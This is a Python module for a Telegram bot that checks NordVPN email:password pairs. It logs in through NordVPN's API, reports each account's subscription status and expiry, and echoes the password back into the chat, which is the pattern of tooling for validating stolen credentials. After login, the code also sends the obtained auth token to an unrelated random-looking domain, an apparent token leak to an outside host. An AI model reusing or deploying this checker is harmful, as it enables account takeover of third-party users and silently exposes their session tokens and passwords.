import requests
import base64
import json
import time
from datetime import datetime

def process_nord_command(bot, message):
    chat_id = message.chat.id
    text = message.text.split()
    if len(text) < 2:
        bot.send_message(chat_id, "Please provide NordVPN credentials in the format: /nord email:password")
        return
    
    credentials = text[1]
    if ":" not in credentials:
        bot.send_message(chat_id, "Please provide NordVPN credentials in the format: /nord email:password")
        return
    
    user, password = credentials.split(":")
    
    start_time = time.time()
    result = check_nord_credentials(user, password)
    elapsed_time = time.time() - start_time
    response_message = format_response(result, elapsed_time, message.from_user.username)
    bot.send_message(chat_id, response_message)

def check_nord_credentials(user, password):
    try:
        login_url = "https://api.nordvpn.com/v1/users/tokens"
        headers = {
            "User-Agent": "Mozilla/5.0",
            "Accept": "application/json",
            "Content-Type": "application/json"
        }
        data = json.dumps({"username": user, "password": password})

        response = requests.post(login_url, headers=headers, data=data)

        if response.status_code == 200:
            response_json = response.json()
            if "token" in response_json:
                token = response_json["token"]
                token_encoded = base64.b64encode(f"token:{token}".encode()).decode()

                subscription_url = "https://zwyr157wwiu6eior.com/v1/users/services"
                headers["Authorization"] = f"Basic {token_encoded}"
                response = requests.get(subscription_url, headers=headers)

                if response.status_code == 200:
                    response_json = response.json()
                    if "expires_at" in response_json:
                        expiration = response_json["expires_at"]
                        expiration_unix = date_to_unix_time(expiration, "%Y-%m-%dT%H:%M:%S.%fZ")
                        current_unix = get_current_unix_time()

                        if expiration_unix > current_unix:
                            return {
                                'user': user,
                                'password': password,
                                'expiry': expiration,
                                'status': 'ACTIVE'
                            }
                        else:
                            return {
                                'user': user,
                                'password': password,
                                'expiry': expiration,
                                'status': 'EXPIRED'
                            }
                    else:
                        return {
                            'user': user,
                            'password': password,
                            'expiry': 'UNKNOWN',
                            'status': 'FREE'
                        }
        return "Unauthorized"
    except Exception as e:
        return str(e)

def get_current_unix_time():
    return int(time.time())

def date_to_unix_time(date_string, date_format="%Y-%m-%dT%H:%M:%S.%fZ"):
    dt = datetime.strptime(date_string, date_format)
    return int(dt.timestamp())

def format_response(data, elapsed_time, username):
    if isinstance(data, str):
        return data
    
    return (f"↯ NORDVPN ACCOUNT CHECK\n\n"
            f"User: {data['user']}\n"
            f"Password: {data['password']}\n"
            f"Expiry: {data['expiry']}\n"
            f"Status: {data['status']}\n\n"
            f"－－－－－－－－－－－－－－－－\n"
            f"⏱️ Time Taken - {elapsed_time:.2f} seconds\n"
            f"▫️ Checked by: {username}\n"
            f"⚡️ Bot by - AFTAB 👑\n"
            f"－－－－－－－－－－－－－－－－")
